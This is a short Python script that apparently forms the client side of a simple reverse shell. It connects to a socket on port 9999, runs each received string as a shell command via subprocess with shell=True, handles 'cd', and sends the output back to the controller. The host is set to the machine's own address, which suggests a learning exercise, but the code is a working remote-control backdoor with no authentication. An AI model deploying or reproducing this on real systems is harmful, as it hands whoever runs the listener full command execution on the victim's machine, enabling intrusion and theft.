import os
import socket
import subprocess

FORMAT = "utf-8"


s = socket.socket()
host = socket.gethostbyname(socket.gethostname())  # Your own ip address
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode(FORMAT) == "cd":
        os.chdir(data[3:].decode(FORMAT))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode(FORMAT), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # opens up a process
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, FORMAT)
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)  # prints results on client's machine also

# Close connection
s.close()
